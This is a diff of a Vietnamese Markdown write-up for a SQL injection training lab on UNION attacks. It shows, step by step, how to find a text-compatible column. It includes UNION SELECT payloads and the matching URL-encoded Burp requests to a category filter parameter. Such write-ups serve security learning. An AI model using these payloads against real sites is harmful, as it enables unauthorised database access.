@@ -1,14 +1,13 @@
 # SQL Injection Lab 08: UNION Attack - Finding a Column Containing Text
 
 ## Mục tiêu
-Xác định cột nào hỗ trợ kiểu dữ liệu text, sau đó hiển thị chuỗi yêu cầu của lab: `KOkBKp`.
+Xác định cột có thể chứa dữ liệu text và hiển thị chuỗi yêu cầu của lab `KOkBKp`.
 
+## Đề bài
 <img src="images/08_union-text-column-2026-04-14-22-40-05.png" alt="Lab overview" width="760" />
+<br><br>
 
-## Các bước thực hiện
-1. Dùng kết quả từ lab trước: query có **3 cột**.
-
-2. Xác nhận lại payload `UNION` với 3 `NULL`:
+## Bước 1: Xác nhận số cột
 
 ```sql
 ' union select null, null, null --
@@ -20,9 +19,10 @@ Query trong Burp:
 GET /filter?category=%27%20union%20select%20null%2C%20null%2C%20null%20-- HTTP/2
 ```
 
-<img src="images/08_union-text-column-2026-04-14-22-44-47.png" alt="Three-column union baseline" width="760" />
+<img src="images/08_union-text-column-2026-04-14-22-44-47.png" alt="Baseline 3 cột" width="760" />
+<br><br>
 
-3. Test cột text bằng cách thay `NULL` bằng chuỗi ở cột 1:
+## Bước 2: Test cột text
 
 ```sql
 ' union select 'aa', null, null --
@@ -34,11 +34,12 @@ Query trong Burp:
 GET /filter?category=%27%20union%20select%20%27aa%27%2C%20null%2C%20null%20-- HTTP/2
 ```
 
-Kết quả lỗi `Internal Server Error` => cột 1 không phù hợp để chứa string trong ngữ cảnh này.
+Kết quả lỗi `Internal Server Error`.
 
-<img src="images/08_union-text-column-2026-04-14-22-46-32.png" alt="String in column 1 failed" width="760" />
+<img src="images/08_union-text-column-2026-04-14-22-46-32.png" alt="Test cột text lỗi" width="760" />
+<br><br>
 
-4. Đưa giá trị lab vào cột 2:
+## Bước 3: Đưa chuỗi lab vào cột phù hợp
 
 ```sql
 ' union select null, 'KOkBKp', null --
@@ -50,12 +51,14 @@ Query trong Burp:
 GET /filter?category=%27%20union%20select%20null%2C%20%27KOkBKp%27%2C%20null%20-- HTTP/2
 ```
 
-Response hiển thị `KOkBKp` và lab được solve.
-
-<img src="images/08_union-text-column-2026-04-14-22-47-56.png" alt="Lab solved with text in column 2" width="760" />
+<img src="images/08_union-text-column-2026-04-14-22-47-56.png" alt="Lab solved" width="760" />
+<br><br>
 
 ## Payload solve
 
 ```sql
 ' union select null, 'KOkBKp', null --
 ```
+
+## Kết quả
+Chuỗi `KOkBKp` xuất hiện trên giao diện và lab được solve.
